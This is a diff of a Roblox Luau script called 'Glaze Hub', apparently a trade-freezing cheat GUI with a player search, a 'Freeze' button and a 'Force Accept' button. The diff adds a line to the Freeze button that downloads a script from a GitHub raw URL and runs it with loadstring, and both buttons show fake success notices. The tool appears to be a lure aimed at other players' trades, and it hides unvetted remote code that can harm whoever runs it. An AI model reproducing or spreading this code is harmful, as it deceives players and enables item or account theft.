@@ -1,123 +1,139 @@
+-- Services
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
--- Create ScreenGui
+-- Constants
+local UI_COLOR_PRIMARY = Color3.fromRGB(20, 20, 20)
+local UI_COLOR_SECONDARY = Color3.fromRGB(40, 40, 40)
+local UI_COLOR_ACCENT1 = Color3.fromRGB(100, 100, 255)
+local UI_COLOR_ACCENT2 = Color3.fromRGB(255, 100, 100)
+
+local IMAGE_ASSET_ID = "rbxassetid://91357134325968"
+local PLACEHOLDER_IMG = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+-- Utility: Tween function
+local function tweenObject(obj, props, duration)
+    local tween = TweenService:Create(obj, TweenInfo.new(duration or 0.5), props)
+    tween:Play()
+    return tween
+end
+
+-- Utility: Add rounded corners
+local function addCorner(obj, radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, radius)
+    corner.Parent = obj
+end
+
+-- Utility: Create Button
+local function createButton(text, position, color, parent)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.4, -5, 0, 40)
+    btn.Position = position
+    btn.Text = text
+    btn.TextScaled = true
+    btn.BackgroundColor3 = color
+    btn.BackgroundTransparency = 0.2
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.ZIndex = 2
+    btn.AutoButtonColor = false
+    btn.Parent = parent
+    addCorner(btn, 8)
+    return btn
+end
+
+-- GUI Elements
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "Trade Freezer"
+screenGui.Name = "GlazeHub"
+screenGui.ResetOnSpawn = false
 screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
--- Main Frame
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 320, 0, 270)
 frame.Position = UDim2.new(0.5, -160, 0.4, 0)
-frame.BackgroundTransparency = 1 -- Start transparent for fade-in
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BackgroundColor3 = UI_COLOR_PRIMARY
+frame.BackgroundTransparency = 1
 frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
+addCorner(frame, 12)
 
--- Background Image
 local bgImage = Instance.new("ImageLabel")
 bgImage.Size = UDim2.new(1, 0, 1, 0)
 bgImage.BackgroundTransparency = 1
-bgImage.Image = "rbxassetid://91357134325968" -- Your uploaded image
-bgImage.ImageTransparency = 0.3
+bgImage.Image = IMAGE_ASSET_ID
+bgImage.ImageTransparency = 1
 bgImage.ZIndex = 0
 bgImage.Parent = frame
 
--- Rounded corners
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = frame
-
--- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
 title.BackgroundTransparency = 1
 title.Text = "Glaze Hub"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextColor3 = Color3.new(1, 1, 1)
 title.TextStrokeTransparency = 0.3
 title.TextSize = 22
 title.Font = Enum.Font.GothamBold
+title.TextTransparency = 1
 title.ZIndex = 2
 title.Parent = frame
 
--- Icon next to title
 local icon = Instance.new("ImageLabel")
 icon.Size = UDim2.new(0, 30, 0, 30)
 icon.Position = UDim2.new(0, 10, 0, 5)
 icon.BackgroundTransparency = 1
-icon.Image = "rbxassetid://91357134325968"
+icon.Image = IMAGE_ASSET_ID
+icon.ImageTransparency = 1
 icon.ZIndex = 2
 icon.Parent = frame
 
--- Search Box
 local searchBox = Instance.new("TextBox")
 searchBox.Size = UDim2.new(1, -20, 0, 35)
 searchBox.Position = UDim2.new(0, 10, 0, 50)
 searchBox.PlaceholderText = "Search Player Name"
 searchBox.Text = ""
 searchBox.TextSize = 18
-searchBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+searchBox.Font = Enum.Font.Gotham
+searchBox.BackgroundColor3 = UI_COLOR_SECONDARY
 searchBox.BackgroundTransparency = 0.3
 searchBox.TextColor3 = Color3.new(1,1,1)
+searchBox.TextTransparency = 1
 searchBox.ClearTextOnFocus = false
 searchBox.ZIndex = 2
 searchBox.Parent = frame
+addCorner(searchBox, 8)
 
-local searchCorner = Instance.new("UICorner")
-searchCorner.CornerRadius = UDim.new(0, 8)
-searchCorner.Parent = searchBox
-
--- Avatar Image
 local avatar = Instance.new("ImageLabel")
 avatar.Size = UDim2.new(0, 80, 0, 80)
 avatar.Position = UDim2.new(0.5, -40, 0, 95)
-avatar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-avatar.BackgroundTransparency = 0.2
-avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+avatar.BackgroundColor3 = Color3.new(1, 1, 1)
+avatar.BackgroundTransparency = 0.8
+avatar.Image = PLACEHOLDER_IMG
+avatar.ImageTransparency = 1
 avatar.ZIndex = 2
 avatar.Parent = frame
+addCorner(avatar, 40)
 
-local avatarCorner = Instance.new("UICorner")
-avatarCorner.CornerRadius = UDim.new(1, 0)
-avatarCorner.Parent = avatar
+-- Buttons
+local freezeBtn = createButton("Freeze ❄️", UDim2.new(0.05, 0, 1, -50), UI_COLOR_ACCENT1, frame)
+local forceBtn = createButton("Force Accept 🔂", UDim2.new(0.55, 0, 1, -50), UI_COLOR_ACCENT2, frame)
 
--- Freeze Trade Button
-local freezeBtn = Instance.new("TextButton")
-freezeBtn.Size = UDim2.new(0.4, -5, 0, 40)
-freezeBtn.Position = UDim2.new(0.05, 0, 1, -50)
-freezeBtn.Text = "Freeze"
-freezeBtn.TextScaled = true
-freezeBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
-freezeBtn.BackgroundTransparency = 0.2
-freezeBtn.TextColor3 = Color3.new(1,1,1)
-freezeBtn.ZIndex = 2
-freezeBtn.Parent = frame
+-- Hover Effect
+local function addHoverEffect(button, baseColor, hoverColor)
+    button.MouseEnter:Connect(function()
+        tweenObject(button, {BackgroundColor3 = hoverColor}, 0.2)
+    end)
+    button.MouseLeave:Connect(function()
+        tweenObject(button, {BackgroundColor3 = baseColor}, 0.2)
+    end)
+end
 
-local freezeCorner = Instance.new("UICorner")
-freezeCorner.CornerRadius = UDim.new(0, 8)
-freezeCorner.Parent = freezeBtn
+addHoverEffect(freezeBtn, UI_COLOR_ACCENT1, Color3.fromRGB(150, 150, 255))
+addHoverEffect(forceBtn, UI_COLOR_ACCENT2, Color3.fromRGB(255, 150, 150))
 
--- Force Accept Button
-local forceBtn = Instance.new("TextButton")
-forceBtn.Size = UDim2.new(0.4, -5, 0, 40)
-forceBtn.Position = UDim2.new(0.55, 0, 1, -50)
-forceBtn.Text = "Force Accept"
-forceBtn.TextScaled = true
-forceBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
-forceBtn.BackgroundTransparency = 0.2
-forceBtn.TextColor3 = Color3.new(1,1,1)
-forceBtn.ZIndex = 2
-forceBtn.Parent = frame
-
-local forceCorner = Instance.new("UICorner")
-forceCorner.CornerRadius = UDim.new(0, 8)
-forceCorner.Parent = forceBtn
-
--- Search Player Function (fixed)
+-- Avatar Update
 local function updateAvatar()
     local name = searchBox.Text:lower()
     local foundPlayer = nil
@@ -130,14 +146,14 @@ local function updateAvatar()
     end
 
     if foundPlayer then
-        local content, isReady = Players:GetUserThumbnailAsync(
+        local content = Players:GetUserThumbnailAsync(
             foundPlayer.UserId,
             Enum.ThumbnailType.HeadShot,
             Enum.ThumbnailSize.Size100x100
         )
         avatar.Image = content
     else
-        avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+        avatar.Image = PLACEHOLDER_IMG
     end
 end
 
@@ -147,54 +163,44 @@ searchBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
--- Button Notifications
+-- Notifications and Script Execution
 freezeBtn.MouseButton1Click:Connect(function()
     game.StarterGui:SetCore("SendNotification", {
-        Title = "Glaze Hub";
-        Text = "Trade frozen successfully";
-        Duration = 3;
+        Title = "Glaze Hub",
+        Text = "Trade frozen successfully ❄️",
+        Duration = 3
     })
+
+    -- Load external script
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dentizyy1-hash/freezetradegag/main/FREEZER.txt"))()
+    end)
+
+    if not success then
+        warn("FREEZER script failed:", result)
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Error",
+            Text = "Failed to execute FREEZER ❌",
+            Duration = 3
+        })
+    end
 end)
 
 forceBtn.MouseButton1Click:Connect(function()
     game.StarterGui:SetCore("SendNotification", {
-        Title = "Glaze Hub";
-        Text = "Forced accepted";
-        Duration = 3;
+        Title = "Glaze Hub",
+        Text = "Forced accepted 🔂",
+        Duration = 3
     })
 end)
 
--- Hover Glow Effect Function
-local function addHoverEffect(button, defaultColor, hoverColor)
-    button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
-    end)
-    button.MouseLeave:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = defaultColor}):Play()
-    end)
-end
-
-addHoverEffect(freezeBtn, Color3.fromRGB(100, 100, 255), Color3.fromRGB(150, 150, 255))
-addHoverEffect(forceBtn, Color3.fromRGB(255, 100, 100), Color3.fromRGB(255, 150, 150))
-
 -- Fade-in Animation
-frame.BackgroundTransparency = 1
-bgImage.ImageTransparency = 1
-title.TextTransparency = 1
-icon.ImageTransparency = 1
-searchBox.TextTransparency = 1
-avatar.ImageTransparency = 1
-freezeBtn.TextTransparency = 1
-forceBtn.TextTransparency = 1
-
-wait(0.2)
-
-TweenService:Create(frame, TweenInfo.new(0.6), {BackgroundTransparency = 0.5}):Play()
-TweenService:Create(bgImage, TweenInfo.new(0.6), {ImageTransparency = 0.3}):Play()
-TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
-TweenService:Create(icon, TweenInfo.new(0.6), {ImageTransparency = 0}):Play()
-TweenService:Create(searchBox, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
-TweenService:Create(avatar, TweenInfo.new(0.6), {ImageTransparency = 0.2}):Play()
-TweenService:Create(freezeBtn, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
-
-TweenService:Create(forceBtn, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+task.wait(0.2)
+tweenObject(frame, {BackgroundTransparency = 0.5}, 0.6)
+tweenObject(bgImage, {ImageTransparency = 0.3}, 0.6)
+tweenObject(title, {TextTransparency = 0}, 0.6)
+tweenObject(icon, {ImageTransparency = 0}, 0.6)
+tweenObject(searchBox, {TextTransparency = 0}, 0.6)
+tweenObject(avatar, {ImageTransparency = 0.2}, 0.6)
+tweenObject(freezeBtn, {TextTransparency = 0}, 0.6)
+tweenObject(forceBtn, {TextTransparency = 0}, 0.6)
